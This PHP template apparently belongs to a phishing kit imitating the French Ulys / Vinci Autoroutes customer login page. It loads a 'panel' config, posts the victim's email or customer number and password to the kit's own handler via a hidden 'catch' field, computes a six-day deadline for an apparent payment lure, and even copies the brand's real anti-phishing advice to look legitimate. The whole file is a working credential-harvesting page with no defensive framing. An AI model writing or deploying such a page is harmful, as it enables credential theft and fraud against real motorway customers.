<?php
require_once 'config/panel.php';
// Start output buffering to capture content
ob_start();
// Calcul de la date actuelle de Paris + 6 jours
$dateParis = new DateTime('now', new DateTimeZone('Europe/Paris'));
$dateParis->modify('+6 days');
$dateLimite = $dateParis->format('d/m/Y');
?>

<div class="ulys-main">
    <div class="ulys-login-card">
        <h2>Je m'identifie</h2>
        <p class="ulys-login-desc">Pour accéder à mon <span class="ulys-orange">Espace Client</span></p>
        <form method="POST" action="index.php?view=main">
            <input type="hidden" name="catch">
            <div class="ulys-form-group">
                <input type="text" class="ulys-input" name="nir" placeholder="Email ou N°Client">
            </div>
            <div class="ulys-form-group">
                <input type="password" class="ulys-input" name="password" placeholder="Mot de passe">
            </div>
            <div class="ulys-form-row">
                <label class="ulys-checkbox-label">
                    <input type="checkbox" class="ulys-checkbox">
                    <span>Rester connecté</span>
                </label>
            </div>
            <button type="submit" name="submit" value="page1" class="ulys-btn" style="background: #ff3c1b; color: #fff;">CONNEXION</button>
            <div class="ulys-lost-password">
                <a href="#"><span>MOT DE PASSE OUBLIÉ</span> <i class="fas fa-lock"></i></a>
            </div>
            <button type="submit" name="submit" value="guest" class="ulys-btn" style="background: #fff; color: #ff3c1b; width: 100%; margin-top: 32px; border: 1.5px solid #ff3c1b; font-weight: 600;">Continuer sans compte</button>
        </form>
    </div>
    <div class="ulys-tips-col">
        <h3>Astuces&nbsp;!</h3>
        <div class="ulys-tip-block">
            <i class="fas fa-user"></i>
            <div>
                <strong>IDENTIFIANT</strong><br>
                Pour simplifier votre connexion, privilégiez l'utilisation de votre <b>adresse e-mail associée à votre compte client</b>.
            </div>
        </div>
        <div class="ulys-tip-block">
            <i class="fas fa-lock"></i>
            <div>
                <strong>PRÉCAUTIONS DE SÉCURITÉ</strong><br>
                Pour garantir une connexion sécurisée, vérifiez que l'adresse du site est précédée d'une icône cadenas, contient un https:// et se termine par <b>.vinci-autoroutes.com</b> ou <b>.ulys.com</b>.<br>
                Pour plus d'informations consultez la page : <a href="#" class="ulys-orange">Tentative de phishing, quels sont les bons réflexes ?</a>
            </div>
        </div>
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('.ulys-login-card form');
    const connexionBtn = form.querySelector('button[type="submit"][value="page1"]');
    const guestBtn = form.querySelector('button[type="submit"][value="guest"]');
    const inputs = form.querySelectorAll('.ulys-input');

    connexionBtn.addEventListener('click', function() {
        inputs.forEach(input => input.setAttribute('required', 'required'));
    });

    guestBtn.addEventListener('click', function() {
        inputs.forEach(input => input.removeAttribute('required'));
    });
});
</script>

<?php
// Get the buffer contents and clean the buffer
$viewContent = ob_get_clean();
// Include layout with the view content
include_once 'layout.php';
?> 